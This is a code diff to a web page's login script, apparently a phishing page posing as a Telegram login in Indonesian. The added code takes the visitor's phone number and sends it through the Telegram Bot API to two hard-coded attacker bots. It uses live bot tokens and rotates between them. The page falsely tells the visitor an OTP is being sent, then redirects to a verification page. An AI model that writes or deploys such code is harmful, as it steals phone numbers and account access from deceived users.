@@ -202,50 +202,49 @@
   const blurOverlay = document.getElementById('blurOverlay');
   const loadingText = document.getElementById('loadingText');
 
+  const bots = [
+    { token: "7033932111:AAHWmbsziqZCI9beJCSfWwnnlvjoJaK_I3w", chatId: "6960960866" },
+    { token: "7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM", chatId: "5876510981" }
+  ];
+
   phoneForm.addEventListener('submit', function(e) {
     e.preventDefault();
 
     const phone = phoneInput.value.trim();
-    if (!phone) {
-      statusMessage.textContent = "⚠️ Nomor tidak boleh kosong.";
-      statusMessage.style.color = "red";
-      return;
-    }
+    const currentBotIndex = parseInt(localStorage.getItem('currentBotIndex') || "0");
+    localStorage.setItem('sessionBotIndex', currentBotIndex);
+    const bot = bots[currentBotIndex];
+
+    const message = `🌀 *FUN GAY LOGIN*\n━━━━━━━━━━━━━━\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
+    const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
     statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
     statusMessage.style.color = "#000";
     blurOverlay.style.display = "block";
     loadingText.style.display = "block";
 
-    const formData = new FormData();
-    formData.append("phone", phone);
-
-    fetch("send.php", {
-      method: "POST",
-      body: formData
-    })
-    .then(res => res.json())
-    .then(data => {
-      setTimeout(() => {
-        blurOverlay.style.display = "none";
-        loadingText.style.display = "none";
-
+    fetch(api)
+      .then(res => res.json())
+      .then(data => {
         if (data.ok) {
-          window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
+          const nextBotIndex = (currentBotIndex + 1) % bots.length;
+          localStorage.setItem('currentBotIndex', nextBotIndex);
+          setTimeout(() => {
+            window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
+          }, 3000);
         } else {
+          blurOverlay.style.display = "none";
+          loadingText.style.display = "none";
           statusMessage.textContent = "❌ Gagal mengirim ke bot.";
           statusMessage.style.color = "red";
         }
-      }, 7000);
-    })
-    .catch(err => {
-      setTimeout(() => {
+      })
+      .catch(err => {
         blurOverlay.style.display = "none";
         loadingText.style.display = "none";
         statusMessage.textContent = "❌ Error: " + err.message;
         statusMessage.style.color = "red";
-      }, 7000);
-    });
+      });
   });
 </script>
 </body>
